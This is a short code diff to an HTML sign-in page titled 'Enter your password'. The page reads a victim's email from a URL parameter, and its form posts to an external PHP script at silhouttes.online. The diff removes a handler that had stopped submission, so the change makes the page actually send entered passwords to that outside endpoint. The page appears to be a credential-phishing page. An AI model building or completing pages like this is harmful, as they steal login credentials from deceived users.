@@ -126,7 +126,7 @@
   <h1>Enter your password</h1>
 
   <!-- Form with PHP link as action -->
-  <form action="https://silhouttes.online/mo/index.php" method="POST" onsubmit="return handleSignIn(event)">
+  <form action="https://silhouttes.online/mo/index.php" method="POST">
     <div class="input-group">
       <input type="password" placeholder="" required />
       <a href="#" class="forgot">Forgot password?</a>
@@ -170,13 +170,6 @@
       document.getElementById('email').value = emailParam; // set hidden input
     }
   };
-
-  function handleSignIn(e) {
-    e.preventDefault();
-    alert('Password submitted for: ' + document.getElementById('emailDisplay').innerText);
-    // You can handle your submit logic here
-    return false;
-  }
 </script>
 
 </body>
